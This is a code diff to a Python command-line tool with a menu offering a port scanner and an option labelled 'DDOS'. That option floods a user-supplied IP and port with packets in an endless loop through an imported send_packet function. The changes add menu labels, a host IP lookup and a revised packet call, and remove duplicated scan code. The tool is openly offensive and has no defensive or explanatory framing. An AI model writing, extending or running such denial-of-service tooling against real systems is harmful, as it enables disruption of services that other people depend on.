@@ -7,6 +7,7 @@ from argparse import ArgumentParser
 import utils
 
 from utils.attack import send_packet
+import time
 
 
 
@@ -14,6 +15,7 @@ global target_ip
 global target_port
 global packet_count
 global ports
+global host_ip
 
 
 def scan_port(target, port):
@@ -52,7 +54,7 @@ def start_attack(target_ip, target_port, packet_count):
         while True:
             ip = target_ip
             try:
-                send_packet(target_ip, target_port, ip)
+                send_packet( target_ip, target_port)
             except Exception as e:
                 print(f"Error in thread: {e}")
 
@@ -78,12 +80,15 @@ def main_menu():
         choice = input("Please select an option (1 or 2): ")
         
         if choice == '1':
+            print("\n--- Port Scanner ---")
             target_ip = input("Enter target IP: ")
             ports_to_scan = range(1, 1025)
     
             start_scan(target_ip, ports_to_scan)
 
         elif choice == '2':
+            print("\n--- DDOS ---")
+            host_ip = socket.gethostbyname(socket.gethostname())
             target_ip = input("Enter target IP: ")
             target_port = int(input("Enter target port: "))
             packet_count = int(input("Enter number of packets to send: "))
@@ -108,9 +113,6 @@ if __name__ == "__main__":
 
     main_menu()
     
-    target_ip = input("Enter target IP: ")
-    ports_to_scan = range(1, 1025)
     
-    start_scan(target_ip, ports_to_scan)
 
     
